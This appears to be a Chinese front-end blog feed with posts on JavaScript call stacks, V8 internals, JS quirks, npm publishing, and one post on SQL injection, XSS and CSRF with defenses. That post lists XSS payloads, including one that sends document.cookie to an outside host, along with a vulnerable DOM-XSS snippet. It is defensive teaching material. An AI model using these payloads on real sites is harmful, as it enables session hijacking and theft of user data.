        <content type="html"><![CDATA[<h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>栈：先进后出，进栈，出栈</p><p>队列：先进先出</p><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>调用栈是 JS 引擎追踪函数执行流程的一种机制，当执行环境中调用了多个函数时，通过这种机制，我们能够追踪到哪个函数正在执行，执行的函数体又调用了哪个函数</p><h5 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h5><p><code>调用栈，调用函数执行才回入栈</code></p><ol><li><p>push average()</p></li><li><p>push sum()</p></li><li><p>shift sum()</p></li><li><p>shift average()</p></li><li><p>push console.log()</p></li><li><p>shift console.log()</p></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sum</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">average</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> aver = <span class="title function_">sum</span>(a, b) / <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">return</span> aver;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> num = <span class="title function_">average</span>(<span class="number">3</span>, <span class="number">5</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num);</span><br></pre></td></tr></table></figure><h4 id="Event-Loop"><a href="#Event-Loop" class="headerlink" title="Event Loop"></a>Event Loop</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">4</span>);</span><br><span class="line">  &#125;, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">function</span> <span class="title function_">executor</span>(<span class="params">resolve</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++) &#123;</span><br><span class="line">      <span class="title function_">resolve</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">2</span>);</span><br><span class="line">  &#125;).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">res</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">3</span>);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p><a href="https://www.bilibili.com/video/BV13k4y1y7vU">参考视频（原文作者）</a></p>]]></content>
      
      
      <categories>
          
          <category> FrontEnd-Tec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> node </tag>
            
            <tag> javascript </tag>
            
            <tag> v8 </tag>
            
            <tag> EventLoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javascript运行原理(二)</title>
      <link href="/2022/03/12/js-runtime2/"/>
      <url>/2022/03/12/js-runtime2/</url>
      
        <content type="html"><![CDATA[<h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><img width="500" align="center" src="/images/js-runtime/7.png" alt="ronaldoxzb" /><h5 id="哪些程序用到-V8"><a href="#哪些程序用到-V8" class="headerlink" title="哪些程序用到 V8"></a>哪些程序用到 V8</h5><ul><li>Chrome 浏览器的 JS 引擎是 V8</li><li>Nodejs 的运行时环境是 V8</li><li>electron 的底层引擎是 V8 【ɪˈlektrɑːn】 跨平台桌面应用开发工具</li></ul><p>blink 是渲染引擎，V8 是 JS 引擎</p><p>访问 Dom 的接口是由 Blink 提供的<br><img width="500" align="center" src="/images/js-runtime/8.png" alt="ronaldoxzb" /></p><h4 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h4><p><code>接收 JavaScript 代码，编译代码后执行 C++程序，编译后的代码可以在多种操作系统多种处理器上运行。</code></p><ol><li>编译和执行 JS 代码</li><li>处理调用栈</li><li>内存分配</li><li>垃圾回收</li></ol><h4 id="V8-的-js-编译和执行"><a href="#V8-的-js-编译和执行" class="headerlink" title="V8 的 js 编译和执行"></a>V8 的 js 编译和执行</h4><img width="500" align="center" src="/images/js-runtime/9.png" alt="ronaldoxzb" /><ol><li>解析器 parser：源代码 -&gt; AST</li><li>解释器 interpreter：AST -&gt; <code>bytecode</code> 或（直接执行<code>bytecode</code> <code>bytecode</code>是可是直接执行的，但是效率没有机器代码效率高）</li><li>编译器 compiler：编译出机器代码（相比于<code>bytecode</code>运行更加高效）</li></ol><p>V8 版本 5.9 之前没有解释器，但是有两个编译器</p><h4 id="5-9-版本的-V8"><a href="#5-9-版本的-V8" class="headerlink" title="5.9 版本的 V8"></a>5.9 版本的 V8</h4><img width="500" align="center" src="/images/js-runtime/11.png" alt="ronaldoxzb" />1. parser 解释器生成抽象语法树 AST<ol start="2"><li><p><code>full-codegen</code>（基准编译器）编译器将 <code>AST</code> 编译成机器代码（未被优化）</p></li><li><p><code>分析器线程</code>收集足够数据（目的：帮助<code>Crankshaft</code>（优化编译器）做代码优化 ）</p></li><li><p>需要优化的<strong>源码</strong>重新解析生成<code>AST</code>，然后由<code>Crankshaft</code>生成优化过后的机器代码</p></li></ol><h5 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h5><ol><li>没有<code>bytecode</code>而是直接编译成机器代码,机器码会占用大量的内存</li><li>缺少中间层机器码，无法实现一些优化策略</li><li>无法很好的支持和优化 JS 的新语特性，无法拥抱未来</li></ol><img width="200" align="center" src="/images/js-runtime/12.png" alt="ronaldoxzb" /><h4 id="新版本的-V8"><a href="#新版本的-V8" class="headerlink" title="新版本的 V8"></a>新版本的 V8</h4><img width="500" align="center" src="/images/js-runtime/13.png" alt="ronaldoxzb" /><ol><li>parser 解析器 生成 AST 抽象语法树</li><li>interpreter 解释器 <code>Ignition</code> 生成 <code>byteCode</code> 字节码 并直接执行</li><li>清除 AST 释放内存空间</li><li>得到 25% - 50%的等效机器代码大小</li><li>compiler 运行过程中，解释器收集优化信息发送给编译器 <code>TurboFan</code></li><li>重新生成机器码</li><li>有些<code>热点函数</code>变更会由优化后的机器码还原成字节码 也就是 <code>deoptimization</code> 回退字节码操作执行</li></ol><img width="500" align="center" src="/images/js-runtime/14.png" alt="ronaldoxzb" /><h5 id="优化点："><a href="#优化点：" class="headerlink" title="优化点："></a>优化点：</h5><ol><li>值声明未调用，不会被解析生成 AST</li><li>函数只被调用一次，bytcode 直接被解释执行，不会进入到编译优化阶段</li><li>函数被调用多次，Igniton 会收集函数类型信息，可能会被标记为热点函数，可能被编译成优化后的机器代码</li></ol><h5 id="好处："><a href="#好处：" class="headerlink" title="好处："></a>好处：</h5><ol><li>由于一开始不需要直接编译成机器码，生成了中间层的字节码，从而节约了时间</li><li>优化编译阶段，不需要从源码重新解析,直接通过字节码进行优化，也可以 deoptimization 回退操作</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sum</span>(<span class="params">x, y</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">sum</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line"><span class="title function_">sum</span>(<span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"><span class="title function_">sum</span>(<span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line"><span class="title function_">sum</span>(<span class="string">&quot;7&quot;</span>, <span class="string">&quot;8&quot;</span>); <span class="comment">//会回退字节码操作执行</span></span><br></pre></td></tr></table></figure><p><a href="https://www.bilibili.com/video/BV1zV411z7RX">参考视频（原文作者）</a></p>]]></content>
      
      
      <categories>
          
          <category> FrontEnd-Tec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> node </tag>
            
            <tag> javascript </tag>
            
            <tag> v8 </tag>
            
            <tag> parser </tag>
            
            <tag> interpreter </tag>
            
            <tag> compiler </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javascript运行原理(一)</title>
      <link href="/2022/03/11/js-runtime1/"/>
      <url>/2022/03/11/js-runtime1/</url>
      
        <content type="html"><![CDATA[<h4 id="JS-的语言组成"><a href="#JS-的语言组成" class="headerlink" title="JS 的语言组成"></a>JS 的语言组成</h4><ul><li>基本语法：C</li><li>数据类型: Java 内存管理：</li><li>函数式编程: Scheme 函数是第一等公民</li><li>原型继承：Self 基于原型 prototype 的继承机制</li></ul><img width="500" align="center" src="/images/js-runtime/1.png" alt="ronaldoxzb" /><h4 id="语言特性"><a href="#语言特性" class="headerlink" title="语言特性"></a>语言特性</h4><ul><li>动态类型语言 JS 编译环境 JIT Just In Time Compilation <code>在运行时编译成机器代码</code></li><li>静态类型语言 C++ 编译环境 AOT Ahead Of Time <code>在运行前提前生成好机器代码</code></li></ul><h4 id="JS-引擎"><a href="#JS-引擎" class="headerlink" title="JS 引擎"></a>JS 引擎</h4><p>将 js 代码编译成机器能够识别的代码，常见的有：</p><ul><li>谷歌 - V8</li><li>苹果 - javaScriptCore</li><li>火狐 - SpideMonkey</li><li>QuickJs</li><li>FaceBook - Hermes</li></ul><img width="500" align="center" src="/images/js-runtime/2.png" alt="ronaldoxzb" />#### 奇葩的JS<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">&#x27;b&#x27;</span>+<span class="string">&#x27;a&#x27;</span>+ + <span class="string">&#x27;a&#x27;</span>+<span class="string">&#x27;a&#x27;</span>+ +<span class="string">&#x27;&#x27;</span>).<span class="title function_">toLowerCase</span>() <span class="comment">//&quot;banana0&quot;</span></span><br><span class="line"><span class="number">0</span> == <span class="string">&#x27;0&#x27;</span>  <span class="comment">//true</span></span><br><span class="line"><span class="number">0</span> == []  <span class="comment">//true</span></span><br><span class="line"><span class="string">&#x27;0&#x27;</span> == []  <span class="comment">//false</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="title class_">NaN</span>  <span class="comment">//number</span></span><br><span class="line"><span class="number">99999999999</span> <span class="comment">//100000000000</span></span><br><span class="line"><span class="number">0.1</span>+<span class="number">0.2</span>==<span class="number">0.3</span> <span class="comment">//false 精度丢失</span></span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">max</span>() <span class="comment">//-Infinity  负无穷</span></span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">min</span>() <span class="comment">//Infinity  正无穷</span></span><br><span class="line">[] + []  <span class="comment">//&quot;&quot;</span></span><br><span class="line">[] + &#123;&#125;  <span class="comment">//&quot;【object object】&quot;</span></span><br><span class="line">&#123;&#125; + []  <span class="comment">// 0</span></span><br><span class="line"><span class="literal">true</span> + <span class="literal">true</span> + <span class="literal">true</span>===<span class="number">3</span>  <span class="comment">//true</span></span><br><span class="line"><span class="literal">true</span> - <span class="literal">true</span>  <span class="comment">//0</span></span><br><span class="line">(!+[]+[]+![]).<span class="property">length</span> <span class="comment">//9 &quot;truefalse&quot;</span></span><br><span class="line"><span class="number">9</span> + <span class="string">&quot;1&quot;</span>  <span class="comment">//91</span></span><br><span class="line"><span class="number">91</span> - <span class="string">&quot;1&quot;</span>  <span class="comment">//90</span></span><br><span class="line">[] == <span class="literal">false</span>  <span class="comment">//true</span></span><br><span class="line"><span class="number">0</span>==<span class="literal">false</span>  <span class="comment">//true</span></span><br><span class="line"><span class="literal">undefined</span> == <span class="literal">false</span>  <span class="comment">//true</span></span><br><span class="line"><span class="title class_">NaN</span> == <span class="literal">false</span>  <span class="comment">//true</span></span><br><span class="line"><span class="string">&quot;&quot;</span> == <span class="literal">false</span>  <span class="comment">//true  包括多空格</span></span><br><span class="line"><span class="literal">null</span> == <span class="literal">false</span>  <span class="comment">//true</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="JS-编译流程"><a href="#JS-编译流程" class="headerlink" title="JS 编译流程"></a>JS 编译流程</h4><ol><li>parser - 将 js 源码通过 parser 解析器生成 AST 抽象语法树<img width="500" align="center" src="/images/js-runtime/3.png" alt="ronaldoxzb" /></li><li>interpreter - 通过解释器将 AST 编程成功字节码 bytecode (字节码与平台无关，是中间层，可以在各个平台上运行)<img width="500" align="center" src="/images/js-runtime/4.png" alt="ronaldoxzb" /></li><li>compiler - 根据当前平台编译出相应的机器代码也就是汇编代码 常见的操作系统平台有：IA32 X64 ARM MIPS<img width="500" align="center" src="/images/js-runtime/5.png" alt="ronaldoxzb" /></li></ol><p><a href="https://www.bilibili.com/video/BV1vh411Z7QG">参考视频（原文作者）</a></p>]]></content>
      
      
      <categories>
          
          <category> FrontEnd-Tec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> node </tag>
            
            <tag> javascript </tag>
            
            <tag> v8 </tag>
            
            <tag> parser </tag>
            
            <tag> interpreter </tag>
            
            <tag> compiler </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见的web攻击及防范</title>
      <link href="/2022/03/08/web-attack/"/>
      <url>/2022/03/08/web-attack/</url>
      
        <content type="html"><![CDATA[<h2 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h2><blockquote><p>所谓 SQL 注入，就是通过把 SQL 命令插入到 Web 表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令。</p></blockquote><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p>SQL 注入攻击指的是通过构建特殊的输入作为参数传入 Web 应用程序，而这些输入大都是 SQL 语法里的一些组合，通过执行 SQL 语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。</p><h3 id="被攻击的原因"><a href="#被攻击的原因" class="headerlink" title="被攻击的原因:"></a>被攻击的原因:</h3><blockquote><p>sql 语句伪造参数，然后在对参数进行拼接的后形成破坏性的 sql 语句，最后导致数据库受到攻击</p></blockquote><h3 id="防护："><a href="#防护：" class="headerlink" title="防护："></a>防护：</h3><ul><li>永远不要信任用户的输入。对用户的输入进行校验，可以通过正则表达式，或限制长度；对单引号和双”-“进行转换等。</li><li>永远不要使用动态拼装 sql，可以使用参数化的 sql 或者直接使用存储过程进行数据查询存取。</li><li>永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。</li><li>不要把机密信息直接存放，加密或者 hash 掉密码和敏感的信息。</li><li>应用的异常信息应该给出尽可能少的提示，最好使用自定义的错误信息对原始错误信息进行包装</li><li>sql 注入的检测方法一般采取辅助软件或网站平台来检测，软件一般采用 sql 注入检测工具 jsky，网站平台就有亿思网站安全平台检测工具。MDCSOFT SCAN 等。采用 MDCSOFT-IPS 可以有效的防御 SQL 注入，XSS 攻击等。</li><li>7.使用预编译语句(PreparedStatement)，这样的话即使我们使用 sql 语句伪造成参数，到了服务端的时候，这个伪造 sql 语句的参数也只是简单的字符，并不能起到攻击的作用。</li></ul><h2 id="跨站脚本攻击-XSS"><a href="#跨站脚本攻击-XSS" class="headerlink" title="跨站脚本攻击(XSS)"></a>跨站脚本攻击(XSS)</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>跨站脚本攻击（XSS，Cross-site scripting）是最常见和基本的攻击 WEB 网站的方法。攻击者在网页上发布包含攻击性代码的数据。当浏览者看到此网页时，特定的脚本就会以浏览者用户的身份和权限来执行。通过 XSS 可以比较容易地修改用户数据、窃取用户信息，以及造成其它类型的攻击，例如 CSRF 攻击</p><h3 id="被攻击的原因-1"><a href="#被攻击的原因-1" class="headerlink" title="被攻击的原因"></a>被攻击的原因</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">- &lt;script&gt;alert(&quot;反射型 XSS 攻击&quot;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">- &lt;script&gt;alert(‘xss’)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">- &lt;a href=&#x27;&#x27; onclick=alert(&#x27;xss&#x27;)&gt;type&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">- &lt;img src=http://1.1.1.1/a.jpg onerror=alert(&#x27;xss&#x27;)&gt;</span><br><span class="line"></span><br><span class="line">- &lt;script&gt;window.location=‘http://192.168.1.1&#x27;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">- &lt;iframe SRC=&quot;http://1.1.1.1/a.jpg&quot; height = &quot;0&quot; width =&quot;0&quot;&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">- &lt;script&gt;new Image().src=&quot;http://1.1.1.1/c.php?output=&quot;+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure><blockquote><p>用户输入的数据变成了代码，比如说上面的 script,应该只是字符串却有了代码的作用。</p></blockquote><h3 id="三种方式"><a href="#三种方式" class="headerlink" title="三种方式"></a>三种方式</h3><p><code>反射型 XSS </code></p><p>只是简单地把用户输入的数据 “反射” 给浏览器，这种攻击方式往往需要攻击者诱使用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。</p><p>访问 localhost:3000 页面上的恶意链接,恶意链接的地址指向了 localhost:8001,我们启动一个 8001 的服务,这样就产生了反射型 XSS 攻击。攻击者可以注入任意的恶意脚本进行攻击，可能注入恶作剧脚本，或者注入能获取用户隐私数据(如 cookie)的脚本，这取决于攻击者的目的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">const http = require(&#x27;http&#x27;);</span><br><span class="line">function handleReequest(req, res) &#123;</span><br><span class="line">    res.setHeader(&#x27;Access-Control-Allow-Origin&#x27;, &#x27;*&#x27;);</span><br><span class="line">    res.writeHead(200, &#123;&#x27;Content-Type&#x27;: &#x27;text/html; charset=UTF-8&#x27;&#125;);</span><br><span class="line">    res.write(&#x27;&lt;script&gt;alert(&quot;反射型 XSS 攻击&quot;)&lt;/script&gt;&#x27;);</span><br><span class="line">    res.end();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const server = new http.Server();</span><br><span class="line">server.listen(8001, &#x27;127.0.0.1&#x27;);</span><br><span class="line">server.on(&#x27;request&#x27;, handleReequest);</span><br></pre></td></tr></table></figure><p><code>存储型</code></p><p>存储型 XSS 会把用户输入的数据 “存储” 在服务器端，当浏览器请求数据时，脚本从服务器上传回并执行。这种 XSS 攻击具有很强的稳定性。</p><p>比较常见的一个场景是攻击者在社区或论坛上写下一篇包含恶意 JavaScript 代码的文章或评论，文章或评论发表后，所有访问该文章或评论的用户，都会在他们的浏览器中执行这段恶意的 JavaScript 代码。</p><p><code>基于DOM</code></p><p>基于 DOM 的 XSS 攻击是指通过恶意脚本修改页面的 DOM 结构，是纯粹发生在客户端的攻击。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2&gt;XSS: &lt;/h2&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; id=&quot;input&quot;&gt;</span><br><span class="line">&lt;button id=&quot;btn&quot;&gt;Submit&lt;/button&gt;</span><br><span class="line">&lt;div id=&quot;div&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    const input = document.getElementById(&#x27;input&#x27;);</span><br><span class="line">    const btn = document.getElementById(&#x27;btn&#x27;);</span><br><span class="line">    const div = document.getElementById(&#x27;div&#x27;);</span><br><span class="line"></span><br><span class="line">    let val;</span><br><span class="line"></span><br><span class="line">    input.addEventListener(&#x27;change&#x27;, (e) =&gt; &#123;</span><br><span class="line">        val = e.target.value;</span><br><span class="line">    &#125;, false);</span><br><span class="line"></span><br><span class="line">    btn.addEventListener(&#x27;click&#x27;, () =&gt; &#123;</span><br><span class="line">        div.innerHTML = `&lt;a href=$&#123;val&#125;&gt;testLink&lt;/a&gt;`</span><br><span class="line">    &#125;, false);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>点击 Submit 按钮后，会在当前页面插入一个链接，其地址为用户的输入内容。如果用户在输入时构造了如下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27; onclick=alert(/xss/)</span><br></pre></td></tr></table></figure><p>用户提交之后，页面代码就变成了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href onlick=&quot;alert(/xss/)&quot;&gt;testLink&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/7871813/42721109-cb7ce572-8766-11e8-96d9-9ada8a787827.gif"></p><h3 id="防护：-1"><a href="#防护：-1" class="headerlink" title="防护："></a>防护：</h3><ul><li>确保输出到 HTML 页面的数据以 HTML 的方式被转义</li><li>前端框架中，都会有一份 decodingMap， 用于对用户输入所包含的特殊字符或标签进行编码或过滤，如 &lt;，&gt;，script，防止 XSS 攻击：</li><li>设置 HttpOnly 严格来说，HttpOnly 并非阻止 XSS 攻击，而是能阻止 XSS 攻击后的 Cookie 劫持攻击。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// vuejs 中的 decodingMap</span><br><span class="line">// 在 vuejs 中，如果输入带 script 标签的内容，会直接过滤掉</span><br><span class="line">const decodingMap = &#123;</span><br><span class="line">  &#x27;&amp;lt;&#x27;: &#x27;&lt;&#x27;,</span><br><span class="line">  &#x27;&amp;gt;&#x27;: &#x27;&gt;&#x27;,</span><br><span class="line">  &#x27;&amp;quot;&#x27;: &#x27;&quot;&#x27;,</span><br><span class="line">  &#x27;&amp;amp;&#x27;: &#x27;&amp;&#x27;,</span><br><span class="line">  &#x27;&amp;#10;&#x27;: &#x27;\n&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="跨站请求伪造攻击（CSRF"><a href="#跨站请求伪造攻击（CSRF" class="headerlink" title="跨站请求伪造攻击（CSRF)"></a>跨站请求伪造攻击（CSRF)</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>跨站请求伪造（CSRF，Cross-site request forgery）是另一种常见的攻击。攻击者通过各种方法伪造一个请求，模仿用户提交表单的行为，从而达到修改用户的数据，或者执行特定任务的目的。为了假冒用户的身份，CSRF 攻击常常和 XSS 攻击配合起来做，但也可以通过其它手段，例如诱使用户点击一个包含攻击的链接</p><h3 id="被攻击的原因："><a href="#被攻击的原因：" class="headerlink" title="被攻击的原因："></a>被攻击的原因：</h3><ul><li><p>用户本地存储 cookie，攻击者利用用户的 cookie 进行认证，然后伪造用户发出请求</p></li><li><p>之所以被攻击是因为攻击者利用了存储在浏览器用于用户认证的 cookie，那么如果我们不用 cookie 来验证不就可以预防了。所以我们可以采用 token（不存储于浏览器）认证，为每一个提交的表单生成一个随机 token， 存储在 session 中，每次验证表单 token，检查 token 是否正确。。</p></li><li><p>通过 referer 识别，HTTP Referer 是 header 的一部分，当浏览器向 web 服务器发送请求的时候，一般会带上 Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。那么这样的话，我们必须登录银行 A 网站才能进行转账了。</p></li></ul><h3 id="防护：-2"><a href="#防护：-2" class="headerlink" title="防护："></a>防护：</h3><ul><li>采用 POST 请求,增加攻击的难度.用户点击一个链接就可以发起 GET 类型的请求。而 POST 请求相对比较难，攻击者往往需要借助 javascript 才能实现</li><li>对请求进行认证，确保该请求确实是用户本人填写表单并提交的，而不是第三者伪造的.具体可以在会话中增加 token,确保看到信息和提交信息的是同一个人</li></ul>]]></content>
      
      
      <categories>
          
          <category> FrontEnd-Tec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
            <tag> web </tag>
            
            <tag> xss </tag>
            
            <tag> csrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何优雅的发布npm包</title>
      <link href="/2022/02/10/npm-publish/"/>
      <url>/2022/02/10/npm-publish/</url>
      
        <content type="html"><![CDATA[<h4 id="一、nrm管理镜像源"><a href="#一、nrm管理镜像源" class="headerlink" title="一、nrm管理镜像源"></a>一、nrm管理镜像源</h4><h4 id="前提是搭好npm私有服务器"><a href="#前提是搭好npm私有服务器" class="headerlink" title="前提是搭好npm私有服务器"></a>前提是搭好npm私有服务器</h4><blockquote><p>我们可以更改npm源为本地地址：</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置npm使用的源为本地私服</span></span><br><span class="line">npm <span class="built_in">set</span> registry http://localhost:4873/</span><br></pre></td></tr></table></figure><blockquote><p>或者针对某个依赖安装时选用自己的源地址：</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install lodash --registry http://localhost:4873</span><br></pre></td></tr></table></figure><blockquote><p>　但是如果我们想再次切换到淘宝或者其他的镜像地址，就不那么方便了；我们可以通过nrm这个工具来管理我们的源地址，可以查看和切换地址；首先还是进行安装：</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g nrm</span><br></pre></td></tr></table></figure><blockquote><p>安装后我们可以通过<code>nrm add [name] [address]</code>这个命令来新增一个源地址：</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nrm add localnpm http://localhost:4873/</span><br></pre></td></tr></table></figure><blockquote><p>　使用nrm ls可以查看我们使用的所有源地址，带*是正在使用的地址；通过nrm use [name]来切换地址：</p></blockquote><p><img src="https://ronaldoxzb.com/upload/2022/02/WeChatc9c7dcbf4fa55e66761034cb45c3d0df-9dc29e918d2e483696ef9288f9bea7ba.png" alt="WeChatc9c7dcbf4fa55e66761034cb45c3d0df.png"></p><h4 id="二、npm发布包"><a href="#二、npm发布包" class="headerlink" title="二、npm发布包"></a>二、npm发布包</h4><blockquote><p>首先我们需要准备一个账号，可以使用–registry来指定npm服务器，或者直接使用nrm来管理</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm adduser</span><br><span class="line">npm adduser --registry=http://example.com</span><br></pre></td></tr></table></figure><blockquote><p>然后进行登录，输入你注册的账号密码邮箱：</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm login</span><br></pre></td></tr></table></figure><blockquote><p>还可以用下面命令退出当前账号：</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 